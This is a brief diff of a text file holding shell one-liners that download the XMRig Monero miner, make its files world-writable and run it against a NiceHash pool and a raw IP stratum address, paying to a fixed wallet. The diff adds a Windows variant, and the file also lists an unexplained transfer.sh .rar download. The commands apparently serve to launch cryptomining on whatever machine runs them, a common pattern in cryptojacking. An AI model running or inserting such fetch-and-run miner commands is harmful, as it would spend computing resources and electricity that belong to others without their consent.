@@ -3,3 +3,4 @@ https://transfer.sh/Gr2R9L/vuive.rar
 wget https://github.com/xmrig/xmrig/releases/download/v6.19.0/xmrig-6.19.0-linux-static-x64.tar.gz && tar -xf xmrig-6.19.0-linux-static-x64.tar.gz && cd xmrig-6.19.0 && chmod 777 * && ./xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u NHbFmwPXdJNT6i4DqdyHhgh8deGTXuZka6Dj -p x -k -a rx/0
 wget https://github.com/xmrig/xmrig/releases/download/v6.19.0/xmrig-6.19.0-linux-static-x64.tar.gz && tar -xf xmrig-6.19.0-linux-static-x64.tar.gz && cd xmrig-6.19.0 && chmod 777 * && ./xmrig -o stratum+tcp://147.185.221.211:46787 -u NHbFmwPXdJNT6i4DqdyHhgh8deGTXuZka6Dj -p x -k -a rx/0
 ./xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u NHbFmwPXdJNT6i4DqdyHhgh8deGTXuZka6Dj -p x -k -a rx/0
+xmrig.exe -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u NHbFmwPXdJNT6i4DqdyHhgh8deGTXuZka6Dj -p x -k -a rx/0
